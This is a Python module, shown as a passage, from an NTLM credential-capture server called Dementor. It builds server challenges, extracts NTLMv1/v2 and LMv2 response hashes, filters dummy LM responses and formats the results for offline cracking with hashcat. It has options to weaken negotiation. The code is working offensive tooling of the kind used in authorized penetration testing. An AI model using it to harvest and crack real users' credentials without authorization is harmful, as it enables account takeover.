# Copyright (c) 2025-Present MatrixEditor
#
# Permission is hereby granted, free of charge, to any person obtaining a copy
# of this software and associated documentation files (the "Software"), to deal
# in the Software without restriction, including without limitation the rights
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
# copies of the Software, and to permit persons to whom the Software is
# furnished to do so, subject to the following conditions:
#
# The above copyright notice and this permission notice shall be included in all
# copies or substantial portions of the Software.
#
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
# SOFTWARE.

"""NTLM authentication helper module for Dementor.

Implements the server-side CHALLENGE_MESSAGE construction and
AUTHENTICATE_MESSAGE hash extraction logic per [MS-NLMP].

Dementor is a capture server -- it does not verify client responses, compute
session keys, or participate in post-authentication signing/sealing.  It only
needs to:

    1. Build a valid CHALLENGE_MESSAGE that keeps the handshake alive.
    2. Extract crackable hashes from the AUTHENTICATE_MESSAGE.
    3. Format those hashes for offline cracking with hashcat.

The three-message NTLM handshake (per [MS-NLMP] section 1.3.1.1):

    Client                                  Server (Dementor)
      |                                         |
      |--- NEGOTIATE_MESSAGE -----------------> |
      |                                         |  <- inspect client flags
      |<-- CHALLENGE_MESSAGE ------------------ |  <- Dementor controls entirely
      |                                         |
      |--- AUTHENTICATE_MESSAGE --------------> |  <- capture & extract hashes
      |                                         |

Variable names follow [MS-NLMP] specification terminology:

    ServerChallenge     8-byte nonce in the CHALLENGE_MESSAGE
    NegotiateFlags      32-bit flag field in any NTLM message
    LmChallengeResponse LM response field from the AUTHENTICATE_MESSAGE
    NtChallengeResponse NT response field from the AUTHENTICATE_MESSAGE
    NTProofStr          First 16 bytes of an NTLMv2 NtChallengeResponse
    Blob                NTLMv2_CLIENT_CHALLENGE -- remainder after NTProofStr
    ClientChallenge     8-byte client nonce (ESS or LMv2)
    UserName            Authenticated user identity from AUTHENTICATE_MESSAGE
    DomainName          Authenticated domain identity from AUTHENTICATE_MESSAGE

Hashcat output formats validated against hashcat module source:

    Mode 5500 (NTLMv1):  User::Domain:LmResponse:NtResponse:ServerChallenge
    Mode 5600 (NTLMv2):  User::Domain:ServerChallenge:NTProofStr:Blob
"""

import time
import calendar
import secrets

from impacket import ntlm

from dementor.config.toml import Attribute
from dementor.config.session import SessionConfig
from dementor.config.util import is_true, get_value, BytesValue
from dementor.log.logger import ProtocolLogger, dm_logger

# ===========================================================================
# Constants
# ===========================================================================

# NTLMv1 responses (both NtChallengeResponse and LmChallengeResponse) are
# always exactly 24 bytes -- the output of the DES-based DESL() function
# defined in [MS-NLMP section 6].  DESL() splits a 16-byte hash into three
# 7-byte DES keys and encrypts the 8-byte challenge with each, producing
# 3x8 = 24 bytes.
#
# NTLMv2 NtChallengeResponse is always > 24 bytes because it contains
# NTProofStr (16 bytes) + NTLMv2_CLIENT_CHALLENGE (variable length).
#
# This constant is the sole discriminator between NTLMv1 and NTLMv2
# responses.  The ESS flag does NOT indicate NTLMv2 -- a response with
# len == 24 and the ESS flag set is NTLMv1-ESS, not NTLMv2.
# Per [MS-NLMP sections 2.2.2.4 and 2.2.2.8].
NTLMV1_RESPONSE_LEN: int = 24

# Length of the ServerChallenge nonce (per [MS-NLMP section 2.2.1.2]).
NTLM_CHALLENGE_LEN: int = 8

# Length of the NTProofStr value extracted from an NTLMv2 NtChallengeResponse.
NTLM_NTPROOFSTR_LEN: int = 16

# Byte offset of TargetName payload in a CHALLENGE_MESSAGE:
# Signature(8) + MessageType(4) + TargetNameFields(8) + NegotiateFlags(4)
# + ServerChallenge(8) + Reserved(8) + TargetInfoFields(8) + Version(8) = 56
NTLM_CHALLENGE_MSG_DOMAIN_OFFSET: int = 56

# 16 zero bytes used as the ESS padding suffix in LmChallengeResponse and
# as the null-hash seed for dummy LM response detection.
NTLM_ESS_ZERO_PAD: bytes = b"\x00" * 16

# Placeholder VERSION structure emitted in CHALLENGE_MESSAGE.
NTLM_VERSION_PLACEHOLDER: bytes = b"\xff" * 8

# VERSION structure per [MS-NLMP section 2.2.2.10]
NTLM_VERSION_LEN: int = 8

# Offset from the Unix epoch (1 Jan 1970) to the Windows FILETIME epoch
# (1 Jan 1601), expressed in 100-nanosecond intervals.
NTLM_FILETIME_EPOCH_OFFSET: int = 116_444_736_000_000_000

# Multiplier converting whole seconds to 100-nanosecond FILETIME ticks.
NTLM_FILETIME_TICKS_PER_SECOND: int = 10_000_000


# ===========================================================================
# Configuration Attributes
#
# Attribute objects define the TOML config file entries and their mapping
# to SessionConfig fields.  Each Attribute specifies:
#   - The SessionConfig field name
#   - The TOML section.key path
#   - A default value
#   - Whether it is global or per-listener
#   - A factory function for type conversion
# ===========================================================================

ATTR_NTLM_CHALLENGE = Attribute(
    "ntlm_challenge",
    "NTLM.Challenge",
    default_val=None,  # None -> random 8-byte ServerChallenge at startup
    section_local=False,
    factory=BytesValue(NTLM_CHALLENGE_LEN),
)

ATTR_NTLM_DISABLE_ESS = Attribute(
    "ntlm_disable_ess",
    "NTLM.DisableExtendedSessionSecurity",
    False,  # Default: ESS enabled -> NTLMv1-SSP hashes
    section_local=False,
    factory=is_true,
)

ATTR_NTLM_DISABLE_NTLMV2 = Attribute(
    "ntlm_disable_ntlmv2",
    "NTLM.DisableNTLMv2",
    False,  # Default: NTLMv2 enabled (TargetInfoFields present)
    section_local=False,
    factory=is_true,
)


# ===========================================================================
# Configuration
# ===========================================================================


def apply_config(session: SessionConfig) -> None:
    """Apply NTLM settings from the TOML config to the session.

    Reads [NTLM] section values and populates:

        session.ntlm_challenge       8-byte ServerChallenge (bytes)
        session.ntlm_disable_ess     Enable ESS flag in CHALLENGE_MESSAGE (bool)
        session.ntlm_disable_ntlmv2  Omit TargetInfoFields to block NTLMv2 (bool)

    The ServerChallenge can be specified as:

        - "hex:1122334455667788"   -- explicit hex (preferred)
        - "ascii:1337LEET"         -- explicit ASCII (preferred)
        - 16 hex characters        -- backward-compatible auto-detect hex
        - 8 ASCII characters       -- backward-compatible auto-detect ASCII
        - Omitted/None             -- 8 cryptographically random bytes

    Notes
    -----
    - Explicit prefixes are preferred because they remove ambiguity.
    - Backward-compatible auto-detect tries hex first only when the string is
      exactly 16 characters; otherwise it tries strict ASCII.
    - 16-character digit-only strings (e.g. "1234567890123456") are treated
      as HEX in auto-detect mode.
    - On any parsing/reading error, safe defaults are kept so startup continues.

    Parameters
    ----------
    session : SessionConfig
        Session object whose NTLM attributes will be populated.
    """
    # Safe defaults first (session remains valid even if config parsing fails)
    session.ntlm_challenge = secrets.token_bytes(NTLM_CHALLENGE_LEN)
    session.ntlm_disable_ess = True
    session.ntlm_disable_ntlmv2 = False

    challenge_source = "random (default)"

    # -- ServerChallenge ---------------------------------------------------
    try:
        raw_challenge = get_value("NTLM", "Challenge", default=None)
    except Exception:
        dm_logger.exception("Failed to read NTLM Challenge; using random bytes")
        challenge_source = "random (read error)"
    else:
        if raw_challenge is None:
            dm_logger.debug("NTLM Challenge not configured; using random bytes")
            challenge_source = "random (not configured)"
        else:
            try:
                challenge_str = str(
                    raw_challenge
                ).strip()  # fixes int -> len(int) crash
            except Exception:
                dm_logger.exception(
                    "Failed to normalize NTLM Challenge; using random bytes"
                )
                challenge_source = "random (normalize error)"
            else:
                if challenge_str == "":
                    dm_logger.warning(
                        "Invalid NTLM Challenge: empty value; using random bytes"
                    )
                    challenge_source = "random (empty value)"
                else:
                    parsed: bytes | None = None
                    lowered = challenge_str.lower()

                    # Preferred explicit forms
                    if lowered.startswith("hex:"):
                        payload = challenge_str[4:].strip()
                        try:
                            candidate = bytes.fromhex(payload)
                            if len(candidate) != NTLM_CHALLENGE_LEN:
                                raise ValueError(
                                    f"decoded length {len(candidate)} != {NTLM_CHALLENGE_LEN}"
                                )
                        except ValueError as exc:
                            dm_logger.warning(
                                "Invalid NTLM Challenge (hex): %r (%s); using random bytes",
                                challenge_str,
                                exc,
                            )
                            challenge_source = "random (invalid hex)"
                        else:
                            parsed = candidate
                            challenge_source = "hex"

                    elif lowered.startswith("ascii:"):
                        payload = challenge_str[6:]
                        try:
                            candidate = payload.encode("ascii")  # strict ASCII
                            if len(candidate) != NTLM_CHALLENGE_LEN:
                                raise ValueError(
                                    f"length {len(candidate)} != {NTLM_CHALLENGE_LEN}"
                                )
                        except (UnicodeEncodeError, ValueError) as exc:
                            dm_logger.warning(
                                "Invalid NTLM Challenge (ascii): %r (%s); using random bytes",
                                challenge_str,
                                exc,
                            )
                            challenge_source = "random (invalid ascii)"
                        else:
                            parsed = candidate
                            challenge_source = "ascii"

                    # Backward-compatible auto-detect
                    else:
                        if len(challenge_str) == 2 * NTLM_CHALLENGE_LEN:
                            try:
                                candidate = bytes.fromhex(challenge_str)
                                if len(candidate) != NTLM_CHALLENGE_LEN:
                                    raise ValueError(
                                        f"decoded length {len(candidate)} != {NTLM_CHALLENGE_LEN}"
                                    )
                            except ValueError:
                                dm_logger.debug(
                                    "NTLM Challenge auto-detect hex parse failed; trying ASCII"
                                )
                            else:
                                parsed = candidate
                                challenge_source = "hex (auto-detect)"

                        if parsed is None:
                            try:
                                candidate = challenge_str.encode(
                                    "ascii"
                                )  # strict ASCII
                                if len(candidate) != NTLM_CHALLENGE_LEN:
                                    raise ValueError(
                                        f"length {len(candidate)} != {NTLM_CHALLENGE_LEN}"
                                    )
                            except (UnicodeEncodeError, ValueError) as exc:
                                dm_logger.warning(
                                    "Invalid NTLM Challenge (auto-detect): %r (%s); using random bytes",
                                    challenge_str,
                                    exc,
                                )
                                challenge_source = "random (invalid auto-detect)"
                            else:
                                parsed = candidate
                                challenge_source = "ascii (auto-detect)"

                    if parsed is not None:
                        session.ntlm_challenge = parsed

    # Always log the final challenge value (including random fallback cases)
    dm_logger.debug("Applying NTLM Challenge as: %s", challenge_source)
    dm_logger.debug("NTLM Challenge set to value: %s", session.ntlm_challenge.hex())

    # -- Extended Session Security -----------------------------------------
    try:
        raw_ess = get_value("NTLM", "DisableExtendedSessionSecurity", default=True)
        session.ntlm_disable_ess = bool(is_true(raw_ess))
    except Exception:
        session.ntlm_disable_ess = False
        dm_logger.exception(
            "Failed to apply NTLM DisableExtendedSessionSecurity; defaulting to False"
        )
    else:
        dm_logger.debug("NTLM DisableExtendedSessionSecurity set to: %s", session.ntlm_disable_ess)

    # -- Disable NTLMv2 ----------------------------------------------------
    try:
        raw_disable_ntlmv2 = get_value("NTLM", "DisableNTLMv2", default=False)
        session.ntlm_disable_ntlmv2 = bool(is_true(raw_disable_ntlmv2))
    except Exception:
        session.ntlm_disable_ntlmv2 = False
        dm_logger.exception("Failed to apply NTLM Disable NTLMv2; defaulting to False")
    else:
        dm_logger.debug("NTLM Disable NTLMv2 set to: %s", session.ntlm_disable_ntlmv2)

    if session.ntlm_disable_ntlmv2:
        dm_logger.warning(
            "NTLM Disable NTLMv2 is enabled — Level 3+ clients (all modern Windows) "
            "will FAIL authentication and NO hashes will be captured. "
            "This only helps against pre-Vista / manually-configured Level 0-2 clients. "
            "Use with caution."
        )


# ===========================================================================
# Wire Encoding Helpers  [MS-NLMP sections 2.2 and 2.2.2.5]
#
# NTLM messages use different character encodings depending on the message
# type and the negotiated flags:
#
# NEGOTIATE_MESSAGE:
#     All string fields are ALWAYS OEM-encoded.  Unicode has not been
#     negotiated yet.  is_negotiate_oem=True in NTLM_AUTH_format_host().
#
# CHALLENGE_MESSAGE / AUTHENTICATE_MESSAGE:
#     Encoding is governed by two flags in NegotiateFlags [MS-NLMP section 2.2.2.5]:
#
#     Bit A (NTLMSSP_NEGOTIATE_UNICODE, 0x01): UTF-16LE
#     Bit B (NTLM_NEGOTIATE_OEM, 0x02):        OEM code page
#
#     Evaluation per spec:
#       A==1:           encoding MUST be Unicode (UTF-16LE, no BOM)
#       A==0, B==1:     encoding MUST be OEM (cp437 baseline)
#       A==0, B==0:     protocol MUST return SEC_E_INVALID_TOKEN
#
# All Unicode strings are UTF-16LE with NO BOM.
# ===========================================================================


def NTLM_AUTH_decode_string(
    data: bytes | None,
    negotiate_flags: int,
    is_negotiate_oem: bool = False,
) -> str:
    """Decode an NTLM wire string into a Python str.

    Parameters
    ----------
    data : bytes or None
        Raw bytes from the NTLM message field.
    negotiate_flags : int
        NegotiateFlags from the message.  Determines encoding for
        CHALLENGE_MESSAGE and AUTHENTICATE_MESSAGE fields.
    is_negotiate_oem : bool
        If True, forces OEM/ASCII decoding regardless of flags.  Set this
        when decoding fields from a NEGOTIATE_MESSAGE, where Unicode
        negotiation has not yet occurred per [MS-NLMP section 2.2].

    Returns
    -------
    str
        Decoded string.  Returns "" for None or empty input.
        Malformed bytes are replaced with U+FFFD rather than raising.
    """
    if not data:
        return ""

    # NEGOTIATE_MESSAGE fields: always OEM -- Unicode has not been negotiated yet
    if is_negotiate_oem:
        return data.decode("ascii", errors="replace")

    # CHALLENGE_MESSAGE / AUTHENTICATE_MESSAGE fields: encoding governed by flags
    if negotiate_flags & ntlm.NTLMSSP_NEGOTIATE_UNICODE:
        return data.decode("utf-16le", errors="replace")

    # OEM fallback -- cp437 as baseline; actual code page is system-dependent
    return data.decode("cp437", errors="replace")


def NTLM_AUTH_encode_string(string: str | None, negotiate_flags: int) -> bytes:
    """Encode a Python str for inclusion in a CHALLENGE_MESSAGE.

    Parameters
    ----------
    string : str or None
        The string to encode (server name, domain, etc.).
    negotiate_flags : int
        NegotiateFlags that determine encoding.

    Returns
    -------
    bytes
        UTF-16LE if Unicode is negotiated, cp437 (OEM) otherwise.
        Returns b"" for None or empty input.
    """
    if not string:
        return b""
    if negotiate_flags & ntlm.NTLMSSP_NEGOTIATE_UNICODE:
        return string.encode("utf-16le")  # No BOM per [MS-NLMP section 2.2]
    return string.encode("cp437", errors="replace")


# ===========================================================================
# Dummy LM Response Filtering  [MS-NLMP section 3.3.1]
#
# When a client cannot compute a valid LM Hash (password exceeds 14 chars
# or LM storage is disabled via Group Policy / NoLMHash registry), it fills
# LmChallengeResponse using DESL() with one of two well-known dummy 16-byte
# inputs:
#
#   1. 16 null bytes (\x00 * 16)
#   2. ntlm.DEFAULT_LM_HASH (AAD3B435B51404EE) -- LMOWFv1(""), the LM Hash
#      of an empty string
#
# These produce predictable 24-byte values that carry no recoverable
# credential material.  Including them in captures would waste cracking
# time, so they should be discarded before logging.
# ===========================================================================


def _compute_dummy_lm_responses(server_challenge: bytes) -> set[bytes]:
    """Compute the two known dummy LmChallengeResponse values.

    Uses impacket's ntlmssp_DES_encrypt() because it already implements
    the 7-byte to 8-byte DES key expansion mandated by [FIPS46-2], cited in
    [MS-NLMP section 1.2.1].

    Parameters
    ----------
    server_challenge : bytes
        The 8-byte ServerChallenge from the CHALLENGE_MESSAGE.

    Returns
    -------
    set of bytes
        Two 24-byte values produced by DESL() with null and empty-string
        LM hashes.  Any captured LmChallengeResponse matching either
        should be discarded -- it contains no crackable password material.
    """
    return {
        ntlm.ntlmssp_DES_encrypt(NTLM_ESS_ZERO_PAD, server_challenge),
        ntlm.ntlmssp_DES_encrypt(ntlm.DEFAULT_LM_HASH, server_challenge),
    }


# ===========================================================================
# NEGOTIATE_MESSAGE Parsing
# ===========================================================================


def NTLM_AUTH_format_host(token: ntlm.NTLMAuthNegotiate) -> str:
    """Extract a human-readable host description from a NEGOTIATE_MESSAGE.

    All string fields in a NEGOTIATE_MESSAGE are OEM-encoded per [MS-NLMP
    section 2.2] -- Unicode has not been negotiated yet, so
    is_negotiate_oem=True is passed to the decoder.

    Parameters
    ----------
    token : NTLMAuthNegotiate
        Parsed NEGOTIATE_MESSAGE from the client.

    Returns
    -------
    str
        "HOSTNAME (domain: DOMAIN) (OS: X.Y.Build)"

        Uses "<UNKNOWN>" for any missing or unparseable field.  Never raises.
    """
    flags: int = 0
    hostname: str = "<UNKNOWN>"
    domain_name: str = "<UNKNOWN>"
    os_version: str = "0.0.0"

    try:
        flags = token["flags"]
        hostname = (
            NTLM_AUTH_decode_string(
                token["host_name"],
                flags,
                is_negotiate_oem=True,
            )
            or "<UNKNOWN>"
        )
        domain_name = (
            NTLM_AUTH_decode_string(
                token["domain_name"],
                flags,
                is_negotiate_oem=True,
            )
            or "<UNKNOWN>"
        )
    except Exception:
        dm_logger.debug(
            "Failed to parse hostname/domain from NEGOTIATE_MESSAGE",
            exc_info=True,
        )

    # Parse the OS VERSION structure separately so a version parse failure
    # does not discard the already-decoded hostname and domain.
    try:
        ver = token["os_version"]
        os_version = (
            f"{ver['ProductMajorVersion']}."
            f"{ver['ProductMinorVersion']}."
            f"{ver['ProductBuild']}"
        )
    except Exception:
        dm_logger.debug(
            "Failed to parse OS version from NEGOTIATE_MESSAGE; using 0.0.0",
            exc_info=True,
        )

    return f"{hostname} (domain: {domain_name}) (OS: {os_version})"


# ===========================================================================
# Hashcat Format Extraction
#
# Output formats validated against hashcat module source code
# (module_05500.c and module_05600.c):
#
# hashcat -m 5500 (NTLMv1 family) -- 6 colon-delimited tokens:
#   [0] UserName             plain text, 0-60 chars
#   [1] (empty)              fixed 0 length -- the "::" separator
#   [2] DomainName           plain text, 0-45 chars
#   [3] LmChallengeResponse  hex, 0-48 chars (0=absent, 48=present)
#   [4] NtChallengeResponse  hex, FIXED 48 chars
#   [5] ServerChallenge      hex, FIXED 16 chars
#
#   ESS auto-detection: if [3] is 48 hex AND bytes 8-23 are zero,
#   hashcat computes MD5(ServerChallenge || ClientChallenge)[0:8]
#   internally.
#   Do NOT pre-compute FinalChallenge; always emit raw ServerChallenge.
#
#   Identity: UserName is null-expanded to UTF-16LE as-is (no toupper).
#
# hashcat -m 5600 (NTLMv2 family) -- 6 colon-delimited tokens:
#   [0] UserName             plain text, 0-60 chars
#   [1] (empty)              fixed 0 length
#   [2] DomainName           plain text, 0-45 chars (case-sensitive)
#   [3] ServerChallenge      hex, FIXED 16 chars
#   [4] NTProofStr           hex, FIXED 32 chars
#   [5] Blob                 hex, 2-1024 chars
#
#   Identity: hashcat applies C toupper() to UserName bytes, then
#   null-expands to UTF-16LE.  DomainName used as-is.
#   User/Domain MUST be decoded plain-text strings, NOT raw hex bytes.
# ===========================================================================


def NTLM_AUTH_to_hashcat_formats(
    server_challenge: bytes,
    user_name: bytes | str,
    domain_name: bytes | str,
    lm_response: bytes | None,
    nt_response: bytes | None,
    negotiate_flags: int,
) -> list[tuple[str, str]]:
    """Extract all crackable hashcat lines from an AUTHENTICATE_MESSAGE.

    Returns every valid hashcat format derivable from the response fields,
    including the LMv2 companion hash when NTLMv2 is present.

    Callers must check for anonymous authentication before invoking.

    Parameters
    ----------
    server_challenge : bytes
        8-byte ServerChallenge from the CHALLENGE_MESSAGE Dementor sent.
    user_name : bytes or str
        UserName from the AUTHENTICATE_MESSAGE.
    domain_name : bytes or str
        DomainName from the AUTHENTICATE_MESSAGE.
    lm_response : bytes or None
        LmChallengeResponse from the AUTHENTICATE_MESSAGE.
    nt_response : bytes or None
        NtChallengeResponse from the AUTHENTICATE_MESSAGE.
    negotiate_flags : int
        NegotiateFlags from the NTLM exchange.

    Returns
    -------
    list of (str, str)
        (version_label, hashcat_line) tuples.  Possible labels:
        "NTLMv2", "LMv2", "NTLMv1-SSP", "NTLMv1".

    Raises
    ------
    ValueError
        If server_challenge is not exactly 8 bytes.

    Notes
    -----
    Extraction filters applied per [MS-NLMP]:

    - NTLMv2 detection uses NtChallengeResponse length (> 24 bytes),
      not flags.  The ESS flag does not indicate v2.
    - Dummy LM filtering discards LmChallengeResponse values generated
      from null or empty-string LM hashes (no crackable material).
    - Level 2 duplication skips the LM slot when the client copies the
      NtChallengeResponse into both fields.
    - Anonymous detection must be performed by callers before invoking.
    """
    if len(server_challenge) != NTLM_CHALLENGE_LEN:
        raise ValueError(
            f"server_challenge must be {NTLM_CHALLENGE_LEN} bytes, "
            f"got {len(server_challenge)}"
        )

    captures: list[tuple[str, str]] = []

    # -- Normalise inputs to concrete types ----------------------------------
    # After this block: lm_response is bytes, nt_response is bytes,
    # user is str, domain is str.
    lm_response = lm_response or b""
    nt_response = nt_response or b""

    # No NtChallengeResponse -> nothing to crack
    if not nt_response:
        dm_logger.debug("NtChallengeResponse is empty; skipping hash extraction")
        return captures

    # Both hashcat modes require decoded plain-text strings, not raw wire
    # bytes.  Hashcat does its own toupper + UTF-16LE expansion internally.
    user: str = (
        NTLM_AUTH_decode_string(bytes(user_name), negotiate_flags)
        if isinstance(user_name, (bytes, bytearray, memoryview))
        else (user_name or "")
    )
    domain: str = (
        NTLM_AUTH_decode_string(bytes(domain_name), negotiate_flags)
        if isinstance(domain_name, (bytes, bytearray, memoryview))
        else (domain_name or "")
    )

    dm_logger.debug(
        "Extracting hashes for user=%r domain=%r nt_len=%d lm_len=%d",
        user,
        domain,
        len(nt_response),
        len(lm_response),
    )

    # ServerChallenge as hex: 8 bytes -> 16 hex chars
    server_challenge_hex: str = server_challenge.hex()

    # ==================================================================
    # NTLMv2 -- NtChallengeResponse is longer than 24 bytes
    #
    # [MS-NLMP section 2.2.2.8]: NTLMv2 NtChallengeResponse structure:
    #   NTProofStr (16 bytes) + NTLMv2_CLIENT_CHALLENGE (variable)
    # Total is always > 24 bytes.
    #
    # NTLMv1 NtChallengeResponse is always exactly 24 bytes (DESL output).
    # ==================================================================
    if len(nt_response) > NTLMV1_RESPONSE_LEN:
        dm_logger.debug("Detected NTLMv2 response (nt_len=%d)", len(nt_response))

        # Split NtChallengeResponse into NTProofStr and Blob
        nt_proof_str_hex: str = nt_response[
            :NTLM_NTPROOFSTR_LEN
        ].hex()  # 32 hex chars (fixed)
        blob_hex: str = nt_response[NTLM_NTPROOFSTR_LEN:].hex()  # Variable length

        # hashcat -m 5600: User::Domain:ServerChallenge:NTProofStr:Blob
        captures.append(
            (
                "NTLMv2",
                f"{user}::{domain}"
                f":{server_challenge_hex}"
                f":{nt_proof_str_hex}"
                f":{blob_hex}",
            )
        )

        # LMv2 always accompanies NTLMv2 per [MS-NLMP section 2.2.2.4].
        # LMv2_RESPONSE = HMAC proof (16 bytes) + ClientChallenge (8 bytes)
        if len(lm_response) == NTLMV1_RESPONSE_LEN:
            if lm_response == b"\x00" * NTLMV1_RESPONSE_LEN:
                dm_logger.debug(
                    "LmChallengeResponse is null (MsvAvTimestamp present "
                    "per [MS-NLMP section 3.1.5.1.2]); skipping LMv2"
                )
            else:
                lm_proof_str_hex: str = lm_response[
                    :NTLM_NTPROOFSTR_LEN
                ].hex()  # 32 hex
                lm_client_challenge_hex: str = lm_response[
                    NTLM_NTPROOFSTR_LEN:NTLMV1_RESPONSE_LEN
                ].hex()  # 16 hex

                dm_logger.debug("Appending LMv2 companion hash")
                # hashcat -m 5600: same format, different proof + challenge
                captures.append(
                    (
                        "LMv2",
                        f"{user}::{domain}"
                        f":{server_challenge_hex}"
                        f":{lm_proof_str_hex}"
                        f":{lm_client_challenge_hex}",
                    )
                )

        return captures

    # ==================================================================
    # NTLMv1 -- NtChallengeResponse is exactly 24 bytes
    #
    # The NtChallengeResponse is always crackable via hashcat -m 5500.
    # The LmChallengeResponse slot is optional (hashcat accepts 0-48
    # hex chars for token[3]) and its contents depend on the ESS state
    # and client LmCompatibilityLevel.
    # ==================================================================
    dm_logger.debug("Detected NTLMv1 response (nt_len=%d)", len(nt_response))

    # NtChallengeResponse as hex: 24 bytes -> 48 hex chars (always valid)
    nt_response_hex: str = nt_response.hex()

    # -- ESS Detection --------------------------------------------------------
    # [MS-NLMP section 3.3.1]: When ESS is active, the client sets:
    #   LmChallengeResponse = ClientChallenge(8) || zeros(16)
    #
    # This pattern is the AUTHORITATIVE ESS fingerprint.
    # The ESS flag in NegotiateFlags is supplementary -- it can disagree
    # due to negotiation quirks.  When they disagree, trust the payload.
    ess_detected: bool = (
        len(lm_response) == NTLMV1_RESPONSE_LEN
        and lm_response[NTLM_CHALLENGE_LEN:] == NTLM_ESS_ZERO_PAD
    )
    ess_flag_set: bool = bool(
        negotiate_flags & ntlm.NTLMSSP_NEGOTIATE_EXTENDED_SESSIONSECURITY
    )

    if ess_flag_set != ess_detected:
        dm_logger.warning(
            "ESS detection disagreement: flag=%s payload=%s "
            "(LmChallengeResponse length=%d); trusting payload",
            ess_flag_set,
            ess_detected,
            len(lm_response),
        )

    # -- NTLMv1 with ESS (NTLMv1-SSP) ----------------------------------------
    if ess_detected:
        dm_logger.debug("ESS detected; emitting NTLMv1-SSP hash")
        # Emit ClientChallenge||zeros(16) in the LM slot (48 hex chars)
        # and the raw ServerChallenge last.  Hashcat detects ESS from
        # the zero-padded LM field and computes
        # MD5(ServerChallenge || ClientChallenge)[0:8] internally.
        # ClientChallenge (8 bytes -> 16 hex) + 16 zero-bytes (-> 32 hex) = 48 hex
        lm_response_hex: str = (
            lm_response[:NTLM_CHALLENGE_LEN].hex() + NTLM_ESS_ZERO_PAD.hex()
        )

        captures.append(
            (
                "NTLMv1-SSP",
                f"{user}::{domain}"
                f":{lm_response_hex}"
                f":{nt_response_hex}"
                f":{server_challenge_hex}",
            )
        )
        return captures

    # -- Pure NTLMv1 (no ESS) ------------------------------------------------
    # Determine the LmChallengeResponse slot contents.
    # The NtChallengeResponse is always the crackable hash.
    # The LmChallengeResponse is optional in hashcat -- it enables a
    # third-key DES optimisation but is not required.
    #
    # We filter out two cases where the LM slot carries no useful data:
    #
    #   1. Level 2 duplication: LmCompatibilityLevel 2 clients copy the
    #      NtChallengeResponse into both fields.  The "LM" value is
    #      actually the NT hash -- including it would be misleading and
    #      would apply the wrong one-way function during cracking.
    #
    #   2. Dummy LM responses: when the client cannot compute a real LM
    #      hash (password >14 chars, or NoLMHash policy), it uses DESL()
    #      with a null or empty-string LM hash.  These produce
    #      deterministic values that waste cracking time.
    lm_response_hex = ""

    if len(lm_response) == NTLMV1_RESPONSE_LEN:
        if lm_response == nt_response:
            # Case 1: Duplication -- LM is a copy of NT, skip it
            dm_logger.debug(
                "LmChallengeResponse == NtChallengeResponse "
                "(duplication); omitting LM slot"
            )
        elif lm_response in _compute_dummy_lm_responses(server_challenge):
            # Case 2: Dummy LM hash -- no crackable material
            dm_logger.debug(
                "LmChallengeResponse matches dummy LM hash; omitting LM slot"
            )
        else:
            # Real LmChallengeResponse -- include it for the DES optimisation
            lm_response_hex = lm_response.hex()
            dm_logger.debug("Including real LmChallengeResponse in NTLMv1 hash")

    dm_logger.debug("Emitting NTLMv1 hash (lm_slot_empty=%s)", lm_response_hex == "")
    # hashcat -m 5500: User::Domain:LmResponse:NtResponse:ServerChallenge
    # The LM slot may be empty (0 hex chars) -- hashcat accepts this.
    captures.append(
        (
            "NTLMv1",
            f"{user}::{domain}"
            f":{lm_response_hex}"
            f":{nt_response_hex}"
            f":{server_challenge_hex}",
        )
    )

    return captures


# ===========================================================================
# Timestamp and FQDN Helpers
# ===========================================================================


def NTLM_new_timestamp() -> int:
    """Generate an NTLM timestamp (Windows FILETIME format).

    Returns the current UTC time as 100-nanosecond intervals since
    January 1, 1601 (the Windows FILETIME epoch).

    Returns
    -------
    int
        Windows FILETIME value for the current UTC time, used to populate
        the MsvAvTimestamp AV_PAIR in the CHALLENGE_MESSAGE TargetInfoFields.
    """
    # NTLM_FILETIME_EPOCH_OFFSET = offset from Unix epoch (1970) to FILETIME epoch (1601)
    # calendar.timegm() -> UTC seconds; x 10^7 -> 100ns intervals
    return (
        NTLM_FILETIME_EPOCH_OFFSET
        + calendar.timegm(time.gmtime()) * NTLM_FILETIME_TICKS_PER_SECOND
    )


def NTLM_split_fqdn(fqdn: str) -> tuple[str, str]:
    """Split a fully-qualified domain name into (hostname, domain).

    Parameters
    ----------
    fqdn : str
        e.g. "SERVER1.corp.example.com"

    Returns
    -------
    tuple of (str, str)
        ("SERVER1", "corp.example.com") if dotted, or
        (fqdn, "WORKGROUP") if no dots present, or
        ("WORKGROUP", "WORKGROUP") if empty.
    """
    if not fqdn:
        return ("WORKGROUP", "WORKGROUP")
    if "." in fqdn:
        hostname, domain = fqdn.split(".", 1)
        return (hostname, domain)
    return (fqdn, "WORKGROUP")


# ===========================================================================
# Anonymous Authentication Detection  [MS-NLMP section 3.2.5.1.2]
# ===========================================================================


def NTLM_AUTH_is_anonymous(token: ntlm.NTLMAuthChallengeResponse) -> bool:
    """Check whether an AUTHENTICATE_MESSAGE represents anonymous (null session) auth.

    Per [MS-NLMP section 3.2.5.1.2], authentication is anonymous when:

    - NTLMSSP_NEGOTIATE_ANONYMOUS (0x00000800) is set, OR
    - UserName is empty AND NtChallengeResponse is empty AND
      LmChallengeResponse is empty or Z(1) (a single null byte).

    Attempting to parse or log empty/null-byte response fields would produce
    garbage entries in the capture database, so anonymous sessions must be
    detected and skipped before any hash extraction.

    Returns True (safe default) on any parse error to avoid logging
    garbage entries.

    Parameters
    ----------
    token : NTLMAuthChallengeResponse
        Parsed AUTHENTICATE_MESSAGE from the client.

    Returns
    -------
    bool
        True if this is an anonymous / null session authentication.
    """
    try:
        if token["flags"] & ntlm.NTLMSSP_NEGOTIATE_ANONYMOUS:
            dm_logger.debug("Anonymous flag set in AUTHENTICATE_MESSAGE")
            return True

        # Structural anonymous: all response fields empty or Z(1)
        user_name: bytes = token["user_name"] or b""
        nt_response: bytes = token["ntlm"] or b""
        lm_response: bytes = token["lanman"] or b""

        is_anon = (
            len(user_name) == 0
            and len(nt_response) == 0
